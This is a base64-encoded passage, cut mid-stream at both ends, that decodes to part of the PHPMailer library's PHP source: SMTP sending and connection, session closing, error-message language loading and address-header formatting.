jbGFzcy4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGhlYWRlciBUaGUgbWVzc2FnZSBoZWFkZXJzCiAgICAgKiBAcGFyYW0gc3RyaW5nICRib2R5IFRoZSBtZXNzYWdlIGJvZHkKICAgICAqIEB0aHJvd3MgcGhwbWFpbGVyRXhjZXB0aW9uCiAgICAgKiBAdXNlcyBTTVRQCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICogQHJldHVybiBib29sZWFuCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBzbXRwU2VuZCgkaGVhZGVyLCAkYm9keSkKICAgIHsKICAgICAgICAkYmFkX3JjcHQgPSBhcnJheSgpOwogICAgICAgIGlmICghJHRoaXMtPnNtdHBDb25uZWN0KCR0aGlzLT5TTVRQT3B0aW9ucykpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnc210cF9jb25uZWN0X2ZhaWxlZCcpLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsKICAgICAgICB9CiAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+U2VuZGVyKSBhbmQgJHRoaXMtPnZhbGlkYXRlQWRkcmVzcygkdGhpcy0+U2VuZGVyKSkgewogICAgICAgICAgICAkc210cF9mcm9tID0gJHRoaXMtPlNlbmRlcjsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkc210cF9mcm9tID0gJHRoaXMtPkZyb207CiAgICAgICAgfQogICAgICAgIGlmICghJHRoaXMtPnNtdHAtPm1haWwoJHNtdHBfZnJvbSkpIHsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCR0aGlzLT5sYW5nKCdmcm9tX2ZhaWxlZCcpIC4gJHNtdHBfZnJvbSAuICcgOiAnIC4gaW1wbG9kZSgnLCcsICR0aGlzLT5zbXRwLT5nZXRFcnJvcigpKSk7CiAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPkVycm9ySW5mbywgc2VsZjo6U1RPUF9DUklUSUNBTCk7CiAgICAgICAgfQoKICAgICAgICAvLyBBdHRlbXB0IHRvIHNlbmQgdG8gYWxsIHJlY2lwaWVudHMKICAgICAgICBmb3JlYWNoIChhcnJheSgkdGhpcy0+dG8sICR0aGlzLT5jYywgJHRoaXMtPmJjYykgYXMgJHRvZ3JvdXApIHsKICAgICAgICAgICAgZm9yZWFjaCAoJHRvZ3JvdXAgYXMgJHRvKSB7CiAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5zbXRwLT5yZWNpcGllbnQoJHRvWzBdKSkgewogICAgICAgICAgICAgICAgICAgICRlcnJvciA9ICR0aGlzLT5zbXRwLT5nZXRFcnJvcigpOwogICAgICAgICAgICAgICAgICAgICRiYWRfcmNwdFtdID0gYXJyYXkoJ3RvJyA9PiAkdG9bMF0sICdlcnJvcicgPT4gJGVycm9yWydkZXRhaWwnXSk7CiAgICAgICAgICAgICAgICAgICAgJGlzU2VudCA9IGZhbHNlOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkaXNTZW50ID0gdHJ1ZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICR0aGlzLT5kb0NhbGxiYWNrKCRpc1NlbnQsIGFycmF5KCR0b1swXSksIGFycmF5KCksIGFycmF5KCksICR0aGlzLT5TdWJqZWN0LCAkYm9keSwgJHRoaXMtPkZyb20pOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAvLyBPbmx5IHNlbmQgdGhlIERBVEEgY29tbWFuZCBpZiB3ZSBoYXZlIHZpYWJsZSByZWNpcGllbnRzCiAgICAgICAgaWYgKChjb3VudCgkdGhpcy0+YWxsX3JlY2lwaWVudHMpID4gY291bnQoJGJhZF9yY3B0KSkgYW5kICEkdGhpcy0+c210cC0+ZGF0YSgkaGVhZGVyIC4gJGJvZHkpKSB7CiAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2RhdGFfbm90X2FjY2VwdGVkJyksIHNlbGY6OlNUT1BfQ1JJVElDQUwpOwogICAgICAgIH0KICAgICAgICBpZiAoJHRoaXMtPlNNVFBLZWVwQWxpdmUpIHsKICAgICAgICAgICAgJHRoaXMtPnNtdHAtPnJlc2V0KCk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHRoaXMtPnNtdHAtPnF1aXQoKTsKICAgICAgICAgICAgJHRoaXMtPnNtdHAtPmNsb3NlKCk7CiAgICAgICAgfQogICAgICAgIC8vQ3JlYXRlIGVycm9yIG1lc3NhZ2UgZm9yIGFueSBiYWQgYWRkcmVzc2VzCiAgICAgICAgaWYgKGNvdW50KCRiYWRfcmNwdCkgPiAwKSB7CiAgICAgICAgICAgICRlcnJzdHIgPSAnJzsKICAgICAgICAgICAgZm9yZWFjaCAoJGJhZF9yY3B0IGFzICRiYWQpIHsKICAgICAgICAgICAgICAgICRlcnJzdHIgLj0gJGJhZFsndG8nXSAuICc6ICcgLiAkYmFkWydlcnJvciddOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oCiAgICAgICAgICAgICAgICAkdGhpcy0+bGFuZygncmVjaXBpZW50c19mYWlsZWQnKSAuICRlcnJzdHIsCiAgICAgICAgICAgICAgICBzZWxmOjpTVE9QX0NPTlRJTlVFCiAgICAgICAgICAgICk7CiAgICAgICAgfQogICAgICAgIHJldHVybiB0cnVlOwogICAgfQoKICAgIC8qKgogICAgICogSW5pdGlhdGUgYSBjb25uZWN0aW9uIHRvIGFuIFNNVFAgc2VydmVyLgogICAgICogUmV0dXJucyBmYWxzZSBpZiB0aGUgb3BlcmF0aW9uIGZhaWxlZC4KICAgICAqIEBwYXJhbSBhcnJheSAkb3B0aW9ucyBBbiBhcnJheSBvZiBvcHRpb25zIGNvbXBhdGlibGUgd2l0aCBzdHJlYW1fY29udGV4dF9jcmVhdGUoKQogICAgICogQHVzZXMgU01UUAogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEB0aHJvd3MgcGhwbWFpbGVyRXhjZXB0aW9uCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHNtdHBDb25uZWN0KCRvcHRpb25zID0gbnVsbCkKICAgIHsKICAgICAgICBpZiAoaXNfbnVsbCgkdGhpcy0+c210cCkpIHsKICAgICAgICAgICAgJHRoaXMtPnNtdHAgPSAkdGhpcy0+Z2V0U01UUEluc3RhbmNlKCk7CiAgICAgICAgfQoKICAgICAgICAvL0lmIG5vIG9wdGlvbnMgYXJlIHByb3ZpZGVkLCB1c2Ugd2hhdGV2ZXIgaXMgc2V0IGluIHRoZSBpbnN0YW5jZQogICAgICAgIGlmIChpc19udWxsKCRvcHRpb25zKSkgewogICAgICAgICAgICAkb3B0aW9ucyA9ICR0aGlzLT5TTVRQT3B0aW9uczsKICAgICAgICB9CgogICAgICAgIC8vIEFscmVhZHkgY29ubmVjdGVkPwogICAgICAgIGlmICgkdGhpcy0+c210cC0+Y29ubmVjdGVkKCkpIHsKICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfQoKICAgICAgICAkdGhpcy0+c210cC0+c2V0VGltZW91dCgkdGhpcy0+VGltZW91dCk7CiAgICAgICAgJHRoaXMtPnNtdHAtPnNldERlYnVnTGV2ZWwoJHRoaXMtPlNNVFBEZWJ1Zyk7CiAgICAgICAgJHRoaXMtPnNtdHAtPnNldERlYnVnT3V0cHV0KCR0aGlzLT5EZWJ1Z291dHB1dCk7CiAgICAgICAgJHRoaXMtPnNtdHAtPnNldFZlcnAoJHRoaXMtPmRvX3ZlcnApOwogICAgICAgICRob3N0cyA9IGV4cGxvZGUoJzsnLCAkdGhpcy0+SG9zdCk7CiAgICAgICAgJGxhc3RleGNlcHRpb24gPSBudWxsOwoKICAgICAgICBmb3JlYWNoICgkaG9zdHMgYXMgJGhvc3RlbnRyeSkgewogICAgICAgICAgICAkaG9zdGluZm8gPSBhcnJheSgpOwogICAgICAgICAgICBpZiAoIXByZWdfbWF0Y2goCiAgICAgICAgICAgICAgICAnL14oKHNzbHx0bHMpOlwvXC8pKihbYS16QS1aMC05XC4tXSp8XFtbYS1mQS1GMC05Ol0rXF0pOj8oWzAtOV0qKSQvJywKICAgICAgICAgICAgICAgIHRyaW0oJGhvc3RlbnRyeSksCiAgICAgICAgICAgICAgICAkaG9zdGluZm8KICAgICAgICAgICAgKSkgewogICAgICAgICAgICAgICAgLy8gTm90IGEgdmFsaWQgaG9zdCBlbnRyeQogICAgICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygnSWdub3JpbmcgaW52YWxpZCBob3N0OiAnIC4gJGhvc3RlbnRyeSk7CiAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgfQogICAgICAgICAgICAvLyAkaG9zdGluZm9bMl06IG9wdGlvbmFsIHNzbCBvciB0bHMgcHJlZml4CiAgICAgICAgICAgIC8vICRob3N0aW5mb1szXTogdGhlIGhvc3RuYW1lCiAgICAgICAgICAgIC8vICRob3N0aW5mb1s0XTogb3B0aW9uYWwgcG9ydCBudW1iZXIKICAgICAgICAgICAgLy8gVGhlIGhvc3Qgc3RyaW5nIHByZWZpeCBjYW4gdGVtcG9yYXJpbHkgb3ZlcnJpZGUgdGhlIGN1cnJlbnQgc2V0dGluZyBmb3IgU01UUFNlY3VyZQogICAgICAgICAgICAvLyBJZiBpdCdzIG5vdCBzcGVjaWZpZWQsIHRoZSBkZWZhdWx0IHZhbHVlIGlzIHVzZWQKICAgICAgICAgICAgJHByZWZpeCA9ICcnOwogICAgICAgICAgICAkc2VjdXJlID0gJHRoaXMtPlNNVFBTZWN1cmU7CiAgICAgICAgICAgICR0bHMgPSAoJHRoaXMtPlNNVFBTZWN1cmUgPT0gJ3RscycpOwogICAgICAgICAgICBpZiAoJ3NzbCcgPT0gJGhvc3RpbmZvWzJdIG9yICgnJyA9PSAkaG9zdGluZm9bMl0gYW5kICdzc2wnID09ICR0aGlzLT5TTVRQU2VjdXJlKSkgewogICAgICAgICAgICAgICAgJHByZWZpeCA9ICdzc2w6Ly8nOwogICAgICAgICAgICAgICAgJHRscyA9IGZhbHNlOyAvLyBDYW4ndCBoYXZlIFNTTCBhbmQgVExTIGF0IHRoZSBzYW1lIHRpbWUKICAgICAgICAgICAgICAgICRzZWN1cmUgPSAnc3NsJzsKICAgICAgICAgICAgfSBlbHNlaWYgKCRob3N0aW5mb1syXSA9PSAndGxzJykgewogICAgICAgICAgICAgICAgJHRscyA9IHRydWU7CiAgICAgICAgICAgICAgICAvLyB0bHMgZG9lc24ndCB1c2UgYSBwcmVmaXgKICAgICAgICAgICAgICAgICRzZWN1cmUgPSAndGxzJzsKICAgICAgICAgICAgfQogICAgICAgICAgICAvL0RvIHdlIG5lZWQgdGhlIE9wZW5TU0wgZXh0ZW5zaW9uPwogICAgICAgICAgICAkc3NsZXh0ID0gZGVmaW5lZCgnT1BFTlNTTF9BTEdPX1NIQTEnKTsKICAgICAgICAgICAgaWYgKCd0bHMnID09PSAkc2VjdXJlIG9yICdzc2wnID09PSAkc2VjdXJlKSB7CiAgICAgICAgICAgICAgICAvL0NoZWNrIGZvciBhbiBPcGVuU1NMIGNvbnN0YW50IHJhdGhlciB0aGFuIHVzaW5nIGV4dGVuc2lvbl9sb2FkZWQsIHdoaWNoIGlzIHNvbWV0aW1lcyBkaXNhYmxlZAogICAgICAgICAgICAgICAgaWYgKCEkc3NsZXh0KSB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXh0ZW5zaW9uX21pc3NpbmcnKS4nb3BlbnNzbCcsIHNlbGY6OlNUT1BfQ1JJVElDQUwpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICRob3N0ID0gJGhvc3RpbmZvWzNdOwogICAgICAgICAgICAkcG9ydCA9ICR0aGlzLT5Qb3J0OwogICAgICAgICAgICAkdHBvcnQgPSAoaW50ZWdlcikkaG9zdGluZm9bNF07CiAgICAgICAgICAgIGlmICgkdHBvcnQgPiAwIGFuZCAkdHBvcnQgPCA2NTUzNikgewogICAgICAgICAgICAgICAgJHBvcnQgPSAkdHBvcnQ7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCR0aGlzLT5zbXRwLT5jb25uZWN0KCRwcmVmaXggLiAkaG9zdCwgJHBvcnQsICR0aGlzLT5UaW1lb3V0LCAkb3B0aW9ucykpIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5IZWxvKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRoZWxsbyA9ICR0aGlzLT5IZWxvOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRoZWxsbyA9ICR0aGlzLT5zZXJ2ZXJIb3N0bmFtZSgpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c210cC0+aGVsbG8oJGhlbGxvKTsKICAgICAgICAgICAgICAgICAgICAvL0F1dG9tYXRpY2FsbHkgZW5hYmxlIFRMUyBlbmNyeXB0aW9uIGlmOgogICAgICAgICAgICAgICAgICAgIC8vICogaXQncyBub3QgZGlzYWJsZWQKICAgICAgICAgICAgICAgICAgICAvLyAqIHdlIGhhdmUgb3BlbnNzbCBleHRlbnNpb24KICAgICAgICAgICAgICAgICAgICAvLyAqIHdlIGFyZSBub3QgYWxyZWFkeSB1c2luZyBTU0wKICAgICAgICAgICAgICAgICAgICAvLyAqIHRoZSBzZXJ2ZXIgb2ZmZXJzIFNUQVJUVExTCiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5TTVRQQXV0b1RMUyBhbmQgJHNzbGV4dCBhbmQgJHNlY3VyZSAhPSAnc3NsJyBhbmQgJHRoaXMtPnNtdHAtPmdldFNlcnZlckV4dCgnU1RBUlRUTFMnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkdGxzID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCR0bHMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+c210cC0+c3RhcnRUTFMoKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnY29ubmVjdF9ob3N0JykpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIC8vIFdlIG11c3QgcmVzZW5kIEVITE8gYWZ0ZXIgVExTIG5lZ290aWF0aW9uCiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5zbXRwLT5oZWxsbygkaGVsbG8pOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPlNNVFBBdXRoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPnNtdHAtPmF1dGhlbnRpY2F0ZSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5Vc2VybmFtZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5QYXNzd29yZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5BdXRoVHlwZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5SZWFsbSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5Xb3Jrc3RhdGlvbgogICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgICAgICkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnYXV0aGVudGljYXRlJykpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgICAgICAgICAgfSBjYXRjaCAocGhwbWFpbGVyRXhjZXB0aW9uICRleGMpIHsKICAgICAgICAgICAgICAgICAgICAkbGFzdGV4Y2VwdGlvbiA9ICRleGM7CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXhjLT5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAgICAgICAgIC8vIFdlIG11c3QgaGF2ZSBjb25uZWN0ZWQsIGJ1dCB0aGVuIGZhaWxlZCBUTFMgb3IgQXV0aCwgc28gY2xvc2UgY29ubmVjdGlvbiBuaWNlbHkKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c210cC0+cXVpdCgpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIC8vIElmIHdlIGdldCBoZXJlLCBhbGwgY29ubmVjdGlvbiBhdHRlbXB0cyBoYXZlIGZhaWxlZCwgc28gY2xvc2UgY29ubmVjdGlvbiBoYXJkCiAgICAgICAgJHRoaXMtPnNtdHAtPmNsb3NlKCk7CiAgICAgICAgLy8gQXMgd2UndmUgY2F1Z2h0IGFsbCBleGNlcHRpb25zLCBqdXN0IHJlcG9ydCB3aGF0ZXZlciB0aGUgbGFzdCBvbmUgd2FzCiAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zIGFuZCAhaXNfbnVsbCgkbGFzdGV4Y2VwdGlvbikpIHsKICAgICAgICAgICAgdGhyb3cgJGxhc3RleGNlcHRpb247CiAgICAgICAgfQogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICAvKioKICAgICAqIENsb3NlIHRoZSBhY3RpdmUgU01UUCBzZXNzaW9uIGlmIG9uZSBleGlzdHMuCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHNtdHBDbG9zZSgpCiAgICB7CiAgICAgICAgaWYgKGlzX2EoJHRoaXMtPnNtdHAsICdTTVRQJykpIHsKICAgICAgICAgICAgaWYgKCR0aGlzLT5zbXRwLT5jb25uZWN0ZWQoKSkgewogICAgICAgICAgICAgICAgJHRoaXMtPnNtdHAtPnF1aXQoKTsKICAgICAgICAgICAgICAgICR0aGlzLT5zbXRwLT5jbG9zZSgpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIC8qKgogICAgICogU2V0IHRoZSBsYW5ndWFnZSBmb3IgZXJyb3IgbWVzc2FnZXMuCiAgICAgKiBSZXR1cm5zIGZhbHNlIGlmIGl0IGNhbm5vdCBsb2FkIHRoZSBsYW5ndWFnZSBmaWxlLgogICAgICogVGhlIGRlZmF1bHQgbGFuZ3VhZ2UgaXMgRW5nbGlzaC4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGxhbmdjb2RlIElTTyA2MzktMSAyLWNoYXJhY3RlciBsYW5ndWFnZSBjb2RlIChlLmcuIEZyZW5jaCBpcyAiZnIiKQogICAgICogQHBhcmFtIHN0cmluZyAkbGFuZ19wYXRoIFBhdGggdG8gdGhlIGxhbmd1YWdlIGZpbGUgZGlyZWN0b3J5LCB3aXRoIHRyYWlsaW5nIHNlcGFyYXRvciAoc2xhc2gpCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXRMYW5ndWFnZSgkbGFuZ2NvZGUgPSAnZW4nLCAkbGFuZ19wYXRoID0gJycpCiAgICB7CiAgICAgICAgLy8gQmFja3dhcmRzIGNvbXBhdGliaWxpdHkgZm9yIHJlbmFtZWQgbGFuZ3VhZ2UgY29kZXMKICAgICAgICAkcmVuYW1lZF9sYW5nY29kZXMgPSBhcnJheSgKICAgICAgICAgICAgJ2JyJyA9PiAncHRfYnInLAogICAgICAgICAgICAnY3onID0+ICdjcycsCiAgICAgICAgICAgICdkaycgPT4gJ2RhJywKICAgICAgICAgICAgJ25vJyA9PiAnbmInLAogICAgICAgICAgICAnc2UnID0+ICdzdicsCiAgICAgICAgICAgICdzcicgPT4gJ3JzJwogICAgICAgICk7CgogICAgICAgIGlmIChpc3NldCgkcmVuYW1lZF9sYW5nY29kZXNbJGxhbmdjb2RlXSkpIHsKICAgICAgICAgICAgJGxhbmdjb2RlID0gJHJlbmFtZWRfbGFuZ2NvZGVzWyRsYW5nY29kZV07CiAgICAgICAgfQoKICAgICAgICAvLyBEZWZpbmUgZnVsbCBzZXQgb2YgdHJhbnNsYXRhYmxlIHN0cmluZ3MgaW4gRW5nbGlzaAogICAgICAgICRQSFBNQUlMRVJfTEFORyA9IGFycmF5KAogICAgICAgICAgICAnYXV0aGVudGljYXRlJyA9PiAnU01UUCBFcnJvcjogQ291bGQgbm90IGF1dGhlbnRpY2F0ZS4nLAogICAgICAgICAgICAnY29ubmVjdF9ob3N0JyA9PiAnU01UUCBFcnJvcjogQ291bGQgbm90IGNvbm5lY3QgdG8gU01UUCBob3N0LicsCiAgICAgICAgICAgICdkYXRhX25vdF9hY2NlcHRlZCcgPT4gJ1NNVFAgRXJyb3I6IGRhdGEgbm90IGFjY2VwdGVkLicsCiAgICAgICAgICAgICdlbXB0eV9tZXNzYWdlJyA9PiAnTWVzc2FnZSBib2R5IGVtcHR5JywKICAgICAgICAgICAgJ2VuY29kaW5nJyA9PiAnVW5rbm93biBlbmNvZGluZzogJywKICAgICAgICAgICAgJ2V4ZWN1dGUnID0+ICdDb3VsZCBub3QgZXhlY3V0ZTogJywKICAgICAgICAgICAgJ2ZpbGVfYWNjZXNzJyA9PiAnQ291bGQgbm90IGFjY2VzcyBmaWxlOiAnLAogICAgICAgICAgICAnZmlsZV9vcGVuJyA9PiAnRmlsZSBFcnJvcjogQ291bGQgbm90IG9wZW4gZmlsZTogJywKICAgICAgICAgICAgJ2Zyb21fZmFpbGVkJyA9PiAnVGhlIGZvbGxvd2luZyBGcm9tIGFkZHJlc3MgZmFpbGVkOiAnLAogICAgICAgICAgICAnaW5zdGFudGlhdGUnID0+ICdDb3VsZCBub3QgaW5zdGFudGlhdGUgbWFpbCBmdW5jdGlvbi4nLAogICAgICAgICAgICAnaW52YWxpZF9hZGRyZXNzJyA9PiAnSW52YWxpZCBhZGRyZXNzOiAnLAogICAgICAgICAgICAnbWFpbGVyX25vdF9zdXBwb3J0ZWQnID0+ICcgbWFpbGVyIGlzIG5vdCBzdXBwb3J0ZWQuJywKICAgICAgICAgICAgJ3Byb3ZpZGVfYWRkcmVzcycgPT4gJ1lvdSBtdXN0IHByb3ZpZGUgYXQgbGVhc3Qgb25lIHJlY2lwaWVudCBlbWFpbCBhZGRyZXNzLicsCiAgICAgICAgICAgICdyZWNpcGllbnRzX2ZhaWxlZCcgPT4gJ1NNVFAgRXJyb3I6IFRoZSBmb2xsb3dpbmcgcmVjaXBpZW50cyBmYWlsZWQ6ICcsCiAgICAgICAgICAgICdzaWduaW5nJyA9PiAnU2lnbmluZyBFcnJvcjogJywKICAgICAgICAgICAgJ3NtdHBfY29ubmVjdF9mYWlsZWQnID0+ICdTTVRQIGNvbm5lY3QoKSBmYWlsZWQuJywKICAgICAgICAgICAgJ3NtdHBfZXJyb3InID0+ICdTTVRQIHNlcnZlciBlcnJvcjogJywKICAgICAgICAgICAgJ3ZhcmlhYmxlX3NldCcgPT4gJ0Nhbm5vdCBzZXQgb3IgcmVzZXQgdmFyaWFibGU6ICcsCiAgICAgICAgICAgICdleHRlbnNpb25fbWlzc2luZycgPT4gJ0V4dGVuc2lvbiBtaXNzaW5nOiAnCiAgICAgICAgKTsKICAgICAgICBpZiAoZW1wdHkoJGxhbmdfcGF0aCkpIHsKICAgICAgICAgICAgLy8gQ2FsY3VsYXRlIGFuIGFic29sdXRlIHBhdGggc28gaXQgY2FuIHdvcmsgaWYgQ1dEIGlzIG5vdCBoZXJlCiAgICAgICAgICAgICRsYW5nX3BhdGggPSBkaXJuYW1lKF9fRklMRV9fKS4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICdsYW5ndWFnZScuIERJUkVDVE9SWV9TRVBBUkFUT1I7CiAgICAgICAgfQogICAgICAgIC8vVmFsaWRhdGUgJGxhbmdjb2RlCiAgICAgICAgaWYgKCFwcmVnX21hdGNoKCcvXlthLXpdezJ9KD86X1thLXpBLVpdezJ9KT8kLycsICRsYW5nY29kZSkpIHsKICAgICAgICAgICAgJGxhbmdjb2RlID0gJ2VuJzsKICAgICAgICB9CiAgICAgICAgJGZvdW5kbGFuZyA9IHRydWU7CiAgICAgICAgJGxhbmdfZmlsZSA9ICRsYW5nX3BhdGggLiAncGhwbWFpbGVyLmxhbmctJyAuICRsYW5nY29kZSAuICcucGhwJzsKICAgICAgICAvLyBUaGVyZSBpcyBubyBFbmdsaXNoIHRyYW5zbGF0aW9uIGZpbGUKICAgICAgICBpZiAoJGxhbmdjb2RlICE9ICdlbicpIHsKICAgICAgICAgICAgLy8gTWFrZSBzdXJlIGxhbmd1YWdlIGZpbGUgcGF0aCBpcyByZWFkYWJsZQogICAgICAgICAgICBpZiAoIXNlbGY6OmlzUGVybWl0dGVkUGF0aCgkbGFuZ19maWxlKSBvciAhaXNfcmVhZGFibGUoJGxhbmdfZmlsZSkpIHsKICAgICAgICAgICAgICAgICRmb3VuZGxhbmcgPSBmYWxzZTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIC8vIE92ZXJ3cml0ZSBsYW5ndWFnZS1zcGVjaWZpYyBzdHJpbmdzLgogICAgICAgICAgICAgICAgLy8gVGhpcyB3YXkgd2UnbGwgbmV2ZXIgaGF2ZSBtaXNzaW5nIHRyYW5zbGF0aW9uIGtleXMuCiAgICAgICAgICAgICAgICAkZm91bmRsYW5nID0gaW5jbHVkZSAkbGFuZ19maWxlOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICR0aGlzLT5sYW5ndWFnZSA9ICRQSFBNQUlMRVJfTEFORzsKICAgICAgICByZXR1cm4gKGJvb2xlYW4pJGZvdW5kbGFuZzsgLy8gUmV0dXJucyBmYWxzZSBpZiBsYW5ndWFnZSBub3QgZm91bmQKICAgIH0KCiAgICAvKioKICAgICAqIEdldCB0aGUgYXJyYXkgb2Ygc3RyaW5ncyBmb3IgdGhlIGN1cnJlbnQgbGFuZ3VhZ2UuCiAgICAgKiBAcmV0dXJuIGFycmF5CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRUcmFuc2xhdGlvbnMoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+bGFuZ3VhZ2U7CiAgICB9CgogICAgLyoqCiAgICAgKiBDcmVhdGUgcmVjaXBpZW50IGhlYWRlcnMuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkdHlwZQogICAgICogQHBhcmFtIGFycmF5ICRhZGRyIEFuIGFycmF5IG9mIHJlY2lwaWVudCwKICAgICAqIHdoZXJlIGVhY2ggcmVjaXBpZW50IGlzIGEgMi1lbGVtZW50IGluZGV4ZWQgYXJyYXkgd2l0aCBlbGVtZW50IDAgY29udGFpbmluZyBhbiBhZGRyZXNzCiAgICAgKiBhbmQgZWxlbWVudCAxIGNvbnRhaW5pbmcgYSBuYW1lLCBsaWtlOgogICAgICogYXJyYXkoYXJyYXkoJ2pvZUBleGFtcGxlLmNvbScsICdKb2UgVXNlcicpLCBhcnJheSgnem9lQGV4YW1wbGUuY29tJywgJ1pvZSBVc2VyJykpCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkckFwcGVuZCgkdHlwZSwgJGFkZHIpCiAgICB7CiAgICAgICAgJGFkZHJlc3NlcyA9IGFycmF5KCk7CiAgICAgICAgZm9yZWFjaCAoJGFkZHIgYXMgJGFkZHJlc3MpIHsKICAgICAgICAgICAgJGFkZHJlc3Nlc1tdID0gJHRoaXMtPmFkZHJGb3JtYXQoJGFkZHJlc3MpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJHR5cGUgLiAnOiAnIC4gaW1wbG9kZSgnLCAnLCAkYWRkcmVzc2VzKSAuICR0aGlzLT5MRTsKICAgIH0KCiAgICAvKioKICAgICAqIEZvcm1hdCBhbiBhZGRyZXNzIGZvciB1c2UgaW4gYSBtZXNzYWdlIGhlYWRlci4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gYXJyYXkgJGFkZHIgQSAyLWVsZW1lbnQgaW5kZXhlZCBhcnJheSwgZWxlbWVudCAwIGNvbnRhaW5pbmcgYW4gYWRkcmVzcywgZWxlbWVudCAxIGNvbnRhaW5pbmcgYSBuYW1lCiAgICAgKiAgICAgIGxpa2UgYXJyYXkoJ2pvZUBleGFtcGxlLmNvbScsICdKb2UgVXNlcicpCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkckZvcm1hdCgkYWRkcikKICAgIHsKICAgICAgICBpZiAoZW1wdHkoJGFkZHJbMV0pKSB7IC8vIE5vIG5hbWUgcHJvdmlkZWQKICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5zZWN1cmVIZWFkZXIoJGFkZHJbMF0pOwogICAgICAgIH0gZWxzZSB7CiAgICAgIC